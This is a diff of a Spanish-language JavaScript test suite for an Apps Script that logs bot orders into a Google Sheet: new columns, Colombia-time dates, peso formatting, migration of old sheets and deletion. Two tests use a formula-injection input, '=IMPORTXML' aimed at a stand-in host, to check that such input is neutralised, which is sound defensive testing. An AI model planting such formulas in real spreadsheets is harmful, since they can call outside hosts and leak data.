@@ -21,8 +21,8 @@ test("Apps Script: agrega, no duplica y rechaza token malo", () => {
   assert.equal(agregar(s, P()).repetido, true);
   const f = s.filas("Pedidos");
   assert.equal(f.length, 2); // encabezado + 1
-  assert.deepEqual(f[1].slice(0, 4), [1, "2026-11-05T15:00:00Z", "telegram", "Ana"]);
-  assert.equal(f[1][8], "nuevo");
+  assert.deepEqual(f[1].slice(0, 4), [1, "05/11/2026 10:00", "telegram", "Ana"]); // fecha en hora de Colombia
+  assert.equal(f[1][10], "nuevo");
 });
 
 test("Apps Script: sin TOKEN configurado rechaza todo; entradas malas", () => {
@@ -41,9 +41,9 @@ test("Apps Script: textos que parecen fórmulas quedan como texto", () => {
   agregar(s, P({ nombre: '=IMPORTXML("http://malo","//a")', nota: "+57 300", contacto: "@x", productos: "-1 × a" }));
   const f = s.filas("Pedidos")[1];
   assert.equal(f[3], "'=IMPORTXML(\"http://malo\",\"//a\")");
-  assert.equal(f[7], "'+57 300");
-  assert.equal(f[5], "'-1 × a");
-  assert.equal(f[4], "'@x");
+  assert.equal(f[9], "'+57 300"); // nota
+  assert.equal(f[6], "'-1 × a"); // productos
+  assert.equal(f[5], "'@x"); // contacto
 });
 
 test("Apps Script: la pestaña Clientes cuenta pedidos y total de cada cliente", () => {
@@ -54,11 +54,11 @@ test("Apps Script: la pestaña Clientes cuenta pedidos y total de cada cliente",
   agregar(s, P({ id: 4, clave: "", nombre: "Sin clave" })); // pedidos anonimizados no crean cliente
   agregar(s, P({ id: 2, total: 99999 })); // repetido: no cuenta dos veces
   const c = s.filas("Clientes");
-  assert.deepEqual(c[0], ["Clave", "Nombre", "Contacto", "Canal", "Pedidos", "Total comprado", "Primer pedido", "Último pedido"]);
+  assert.deepEqual(c[0], ["Clave", "Nombre", "Celular", "Contacto", "Canal", "Pedidos", "Total comprado", "Primer pedido", "Último pedido"]);
   assert.equal(c.length, 3);
   // «@ana» se protege con una comilla delante (igual que las fórmulas); Google la oculta al mostrar la celda.
-  assert.deepEqual(c[1], ["telegram:111", "Ana Maria", "'@ana", "telegram", 2, 100000, "2026-11-05T15:00:00Z", "2026-11-06T10:00:00Z"]);
-  assert.deepEqual(c[2].slice(0, 6), ["whatsapp:573001112233", "Beto", "https://wa.me/573001112233", "whatsapp", 1, 5000]);
+  assert.deepEqual(c[1], ["telegram:111", "Ana Maria", "", "'@ana", "telegram", 2, 100000, "05/11/2026 10:00", "06/11/2026 05:00"]);
+  assert.deepEqual(c[2].slice(0, 7), ["whatsapp:573001112233", "Beto", "", "https://wa.me/573001112233", "whatsapp", 1, 5000]);
 });
 
 test("Apps Script: borrar deja el pedido en blanco y quita al cliente", () => {
@@ -68,8 +68,8 @@ test("Apps Script: borrar deja el pedido en blanco y quita al cliente", () => {
   const r = s.post({ token: TOKEN, accion: "borrar", ids: [1, 99], clave: "telegram:111" });
   assert.deepEqual([r.borrados, r.clientes], [1, 1]);
   const f = s.filas("Pedidos");
-  assert.deepEqual([f[1][3], f[1][4], f[1][7]], ["(borrado)", "(borrado)", "(borrado)"]);
-  assert.equal(f[1][6], 70000); // el total se conserva
+  assert.deepEqual([f[1][3], f[1][4], f[1][5], f[1][8], f[1][9]], ["(borrado)", "(borrado)", "(borrado)", "(borrado)", "(borrado)"]); // nombre, celular, contacto, dirección y nota
+  assert.equal(f[1][7], 70000); // el total se conserva
   assert.equal(f[2][3], "Bea");
   const c = s.filas("Clientes");
   assert.equal(c.length, 2);
@@ -288,7 +288,9 @@ test("de punta a punta: el motor y el Apps Script de verdad: pedido, cliente y B
   await pedirUno(ctx, "321"); // el mismo cliente pide otra vez
   assert.equal(script.filas("Pedidos").length, 3);
   const c = script.filas("Clientes");
-  assert.deepEqual([c[1][0], c[1][1], c[1][4], c[1][5]], ["telegram:321", "Carla Inventada", 2, 70000]);
+  assert.deepEqual([c[1][0], c[1][1], c[1][2], c[1][5], c[1][6]], ["telegram:321", "Carla Inventada", "300 123 4567", 2, 70000]);
+  assert.equal(script.filas("Pedidos")[1][8], "Calle Inventada 1"); // la dirección va en su propia columna
+  assert.equal(script.filas("Pedidos")[1][9], ""); // sin nota
   await dice(ctx, "321", "BORRAR");
   assert.equal(script.filas("Clientes").length, 1); // solo el encabezado
   assert.deepEqual(script.filas("Pedidos").slice(1).map((f) => f[3]), ["(borrado)", "(borrado)"]);
@@ -325,4 +327,124 @@ test("Telegram: /reintentar solo para la dueña, y avisa si no hay hoja", async 
   await telegramWebhook(req(3, 999), { ...env, ...ENVH }, { ...deps, fetch: f });
   assert.equal(llamadasHoja.length, 1);
   assert.deepEqual(await deps.store.pedidosSinCopiar(), []);
+});
+
+// ---------- hoja más clara: fecha de Colombia, celular, dirección y nota separados, total en pesos ----------
+test("Apps Script: celular, dirección y nota en columnas propias; fecha de Colombia; total con formato de pesos", () => {
+  const s = cargarAppsScript();
+  agregar(s, P({ creado: "2026-11-18T22:39:12.738Z", telefono: "300 123 4567", direccion: "Calle Inventada 1", notaLibre: "Timbre dañado", contactoCanal: "@ana", contacto: "300 123 4567 · @ana", nota: "Dirección: Calle Inventada 1 | Nota: Timbre dañado" }));
+  const f = s.filas("Pedidos");
+  assert.deepEqual(f[0], ["Pedido", "Fecha", "Canal", "Nombre", "Celular", "Contacto", "Productos", "Total", "Dirección", "Nota", "Estado"]);
+  assert.deepEqual(f[1], [1, "18/11/2026 17:39", "telegram", "Ana", "300 123 4567", "'@ana", "2 × Gorra", 70000, "Calle Inventada 1", "Timbre dañado", "nuevo"]);
+  assert.equal(typeof f[1][7], "number"); // sigue siendo número: se puede sumar
+  const formatos = s.hojas["Pedidos"].formatos.map((x) => [x.col, x.formato]);
+  assert.deepEqual(formatos, [[8, '"$"#,##0']]);
+  assert.deepEqual(s.hojas["Clientes"].formatos.map((x) => [x.col, x.formato]), [[7, '"$"#,##0']]);
+});
+
+test("Apps Script: si el pedido llega con todo junto (como en /reintentar), se separa", () => {
+  const s = cargarAppsScript();
+  const caso = (id, contacto, nota) => agregar(s, P({ id, clave: "", contacto, nota }));
+  caso(1, "300 123 4567 · @ana", "Dirección: Calle 1 | Nota: Timbre");
+  caso(2, "300 123 4567", "Dirección: Calle 2");
+  caso(3, "https://wa.me/573001112233", "Nota: solo una nota");
+  caso(4, "+34600111222 · @x", "Dirección: Calle 4 | Nota: con | barra");
+  caso(5, "", "");
+  caso(6, "(borrado)", "(borrado)");
+  caso(7, "300 123 4567 · https://wa.me/573001112233", "Calle sin etiqueta");
+  const f = s.filas("Pedidos").slice(1).map((r) => [r[4], r[5], r[8], r[9]]);
+  assert.deepEqual(f, [
+    ["300 123 4567", "'@ana", "Calle 1", "Timbre"],
+    ["300 123 4567", "", "Calle 2", ""],
+    ["", "https://wa.me/573001112233", "", "solo una nota"],
+    ["'+34600111222", "'@x", "Calle 4", "con | barra"],
+    ["", "", "", ""],
+    ["", "(borrado)", "", "(borrado)"],
+    ["300 123 4567", "https://wa.me/573001112233", "", "Calle sin etiqueta"],
+  ]);
+});
+
+test("Apps Script: la hora de Colombia cambia el día cuando toca; lo que no es fecha se deja igual", () => {
+  const s = cargarAppsScript();
+  for (const [id, creado] of [[1, "2026-11-06T04:30:00Z"], [2, "2026-11-06T05:00:00Z"], [3, "no es fecha"], [4, "2026-01-01T03:05:00Z"]]) agregar(s, P({ id, clave: "", creado }));
+  assert.deepEqual(s.filas("Pedidos").slice(1).map((r) => r[1]), ["05/11/2026 23:30", "06/11/2026 00:00", "no es fecha", "31/12/2025 22:05"]);
+});
+
+test("Apps Script: un cliente que repite sin celular o sin usuario conserva lo que ya había dado", () => {
+  const s = cargarAppsScript();
+  agregar(s, P({ id: 1, telefono: "300 123 4567", direccion: "Calle 1", notaLibre: "", contactoCanal: "@ana" }));
+  agregar(s, P({ id: 2, telefono: "", direccion: "Calle 2", notaLibre: "", contactoCanal: "" }));
+  const c = s.filas("Clientes");
+  assert.equal(c.length, 2);
+  assert.deepEqual([c[1][2], c[1][3], c[1][5]], ["300 123 4567", "'@ana", 2]);
+  // Y si da uno nuevo, se actualiza.
+  agregar(s, P({ id: 3, telefono: "310 555 6677", direccion: "Calle 3", notaLibre: "", contactoCanal: "" }));
+  assert.equal(s.filas("Clientes")[1][2], "310 555 6677");
+});
+
+test("Apps Script: una hoja con el formato anterior se convierte sola, sin perder filas", () => {
+  const s = cargarAppsScript();
+  const viejo = ["Pedido", "Fecha", "Canal", "Nombre", "Contacto", "Productos", "Total", "Nota", "Estado"];
+  s.poner("Pedidos", 1, viejo);
+  s.poner("Pedidos", 2, [7, "2026-11-18T22:39:12.738Z", "telegram", "Jaylis Inventada", "", "2 × Rosa de foami", 9000, "Dirección: Recojo | Nota: Para el 23", "nuevo"]);
+  s.poner("Pedidos", 3, [8, "2026-11-18T23:00:00Z", "telegram", "Beto", "300 123 4567 · @beto", "1 × Gorra", 35000, "Dirección: Calle 8", "entregado"]);
+  s.poner("Pedidos", 4, [9, "2026-11-18T23:10:00Z", "telegram", "(borrado)", "(borrado)", "1 × Gorra", 35000, "(borrado)", "nuevo"]);
+  s.poner("Clientes", 1, ["Clave", "Nombre", "Contacto", "Canal", "Pedidos", "Total comprado", "Primer pedido", "Último pedido"]);
+  s.poner("Clientes", 2, ["telegram:1", "Beto", "300 123 4567 · @beto", "telegram", 2, 70000, "2026-11-18T23:00:00Z", "2026-11-19T01:00:00Z"]);
+
+  assert.equal(agregar(s, P({ id: 10, clave: "telegram:1", nombre: "Beto", telefono: "300 123 4567", direccion: "Calle 10", notaLibre: "", contactoCanal: "@beto" })).ok, true);
+
+  const f = s.filas("Pedidos");
+  assert.deepEqual(f[0], ["Pedido", "Fecha", "Canal", "Nombre", "Celular", "Contacto", "Productos", "Total", "Dirección", "Nota", "Estado"]);
+  assert.deepEqual(f[1], [7, "18/11/2026 17:39", "telegram", "Jaylis Inventada", "", "", "2 × Rosa de foami", 9000, "Recojo", "Para el 23", "nuevo"]);
+  assert.deepEqual(f[2], [8, "18/11/2026 18:00", "telegram", "Beto", "300 123 4567", "'@beto", "1 × Gorra", 35000, "Calle 8", "", "entregado"]); // conserva el estado que le pusieron
+  assert.deepEqual(f[3], [9, "18/11/2026 18:10", "telegram", "(borrado)", "(borrado)", "(borrado)", "1 × Gorra", 35000, "(borrado)", "(borrado)", "nuevo"]);
+  assert.equal(f[4][0], 10); // y el pedido nuevo quedó debajo, en el formato nuevo
+  assert.equal(f.length, 5);
+
+  const c = s.filas("Clientes");
+  assert.deepEqual(c[0], ["Clave", "Nombre", "Celular", "Contacto", "Canal", "Pedidos", "Total comprado", "Primer pedido", "Último pedido"]);
+  assert.deepEqual(c[1], ["telegram:1", "Beto", "300 123 4567", "'@beto", "telegram", 3, 140000, "18/11/2026 18:00", "05/11/2026 10:00"]); // 70.000 de antes + 70.000 del pedido nuevo
+
+  // Una segunda vez no vuelve a convertir nada.
+  agregar(s, P({ id: 11, clave: "", telefono: "", direccion: "Calle 11", notaLibre: "", contactoCanal: "" }));
+  assert.equal(s.filas("Pedidos").length, 6);
+  assert.equal(s.filas("Pedidos")[1][4], "");
+});
+
+test("Apps Script: al convertir la hoja vieja, los textos con pinta de fórmula siguen siendo texto", () => {
+  const s = cargarAppsScript();
+  s.poner("Pedidos", 1, ["Pedido", "Fecha", "Canal", "Nombre", "Contacto", "Productos", "Total", "Nota", "Estado"]);
+  // Google devuelve estos textos sin la comilla que los protegía.
+  s.poner("Pedidos", 2, [1, "2026-11-18T22:39:12.738Z", "telegram", '=IMPORTXML("http://malo","//a")', "@x", "-1 × a", 5000, "+57 300", "nuevo"]);
+  agregar(s, P({ id: 2, clave: "" }));
+  const f = s.filas("Pedidos")[1];
+  assert.equal(f[3], "'=IMPORTXML(\"http://malo\",\"//a\")");
+  assert.equal(f[5], "'@x");
+  assert.equal(f[6], "'-1 × a");
+  assert.equal(f[9], "'+57 300");
+  for (const x of f.filter((v) => typeof v === "string")) assert.ok(!/^[=+\-@\t\r]/.test(x), x);
+});
+
+test("Apps Script: si alguien cambió los encabezados o agregó columnas, la hoja no se toca", () => {
+  const s = cargarAppsScript();
+  s.poner("Pedidos", 1, ["Pedido", "Fecha", "Canal", "Nombre", "Contacto", "Productos", "Total", "Nota", "Estado", "Mi columna"]);
+  s.poner("Pedidos", 2, [1, "2026-11-18T22:39:12.738Z", "telegram", "Ana", "@ana", "1 × Gorra", 35000, "Calle 1", "nuevo", "mío"]);
+  agregar(s, P({ id: 2, clave: "" }));
+  assert.deepEqual(s.filas("Pedidos")[1], [1, "2026-11-18T22:39:12.738Z", "telegram", "Ana", "@ana", "1 × Gorra", 35000, "Calle 1", "nuevo", "mío"]);
+});
+
+test("el Worker manda a la hoja el celular, la dirección y la nota por separado", async () => {
+  const script = cargarAppsScript();
+  const registro = [];
+  const ctx = crearCtx(NEGOCIOS["gorras"]);
+  ctx.hoja = crearHoja(ENVH, fetchHaciaAppsScript(script, registro), ctx.store);
+  await pedirUno(ctx, "654");
+  const enviado = registro.find((x) => x.accion === "agregar").pedido;
+  assert.equal(enviado.telefono, "300 123 4567");
+  assert.equal(enviado.direccion, "Calle Inventada 1");
+  assert.equal(enviado.notaLibre, "");
+  assert.equal(enviado.contactoCanal, "");
+  assert.equal(enviado.contacto, "300 123 4567"); // y lo de siempre, junto, para una hoja con el programa viejo
+  assert.equal(enviado.nota, "Dirección: Calle Inventada 1");
 });
